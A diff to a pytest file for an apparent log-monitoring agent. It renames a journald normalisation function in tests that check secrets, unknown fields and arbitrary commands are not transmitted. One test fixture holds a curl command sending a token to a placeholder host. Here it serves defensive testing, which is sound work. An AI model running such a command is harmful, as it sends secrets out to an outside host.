@@ -6,7 +6,7 @@ from pathlib import Path
 
 import pytest
 
-from woland_guard_agent.normalization import normalize_journald_record
+from woland_guard_agent.normalization import normalize_record
 from woland_guard_agent.sources import JournalRecord
 from woland_guard_agent.sources.journald import parse_journal_json_line
 
@@ -17,7 +17,7 @@ def test_normalizes_supported_ssh_fixture_with_fixed_fields() -> None:
     record = parse_journal_json_line(FIXTURE.read_text(encoding="utf-8"))
     assert record is not None
 
-    event = normalize_journald_record(
+    event = normalize_record(
         record,
         collected_at=datetime(2024, 7, 3, 10, 0, tzinfo=UTC),
     )
@@ -65,7 +65,7 @@ def test_supported_messages_have_specific_event_types(
     message: str,
     event_type: str,
 ) -> None:
-    event = normalize_journald_record(
+    event = normalize_record(
         JournalRecord(
             cursor=f"s=synthetic;i={event_type}",
             fields={"SYSLOG_IDENTIFIER": identifier, "MESSAGE": message},
@@ -78,7 +78,7 @@ def test_supported_messages_have_specific_event_types(
 
 def test_arbitrary_command_in_message_is_not_transmitted() -> None:
     command = "curl https://example.invalid/?token=unknown-secret"
-    event = normalize_journald_record(
+    event = normalize_record(
         JournalRecord(
             cursor="s=synthetic;i=command",
             fields={"SYSLOG_IDENTIFIER": "bash", "MESSAGE": command},
@@ -92,7 +92,7 @@ def test_unknown_fields_and_secret_are_not_transmitted() -> None:
     raw = json.loads(FIXTURE.read_text(encoding="utf-8"))
     raw["UNSUPPORTED_SECRET"] = "unknown-secret-value"  # noqa: S105 - synthetic
     record = JournalRecord(cursor=str(raw["__CURSOR"]), fields=raw)
-    event = normalize_journald_record(record)
+    event = normalize_record(record)
 
     assert event is not None
     serialized = event.model_dump_json()
@@ -102,7 +102,7 @@ def test_unknown_fields_and_secret_are_not_transmitted() -> None:
 
 
 def test_unknown_message_is_not_sent() -> None:
-    event = normalize_journald_record(
+    event = normalize_record(
         JournalRecord(
             cursor="s=synthetic;i=unknown",
             fields={"SYSLOG_IDENTIFIER": "sshd", "MESSAGE": "unrecognized secret"},
@@ -113,7 +113,7 @@ def test_unknown_message_is_not_sent() -> None:
 
 
 def test_nul_message_is_skipped_before_contract_validation() -> None:
-    event = normalize_journald_record(
+    event = normalize_record(
         JournalRecord(
             cursor="s=synthetic;i=nul",
             fields={
@@ -135,8 +135,8 @@ def test_event_id_is_deterministic_for_journald_cursor() -> None:
         },
     )
 
-    first = normalize_journald_record(record)
-    second = normalize_journald_record(record)
+    first = normalize_record(record)
+    second = normalize_record(record)
 
     assert first is not None
     assert second is not None
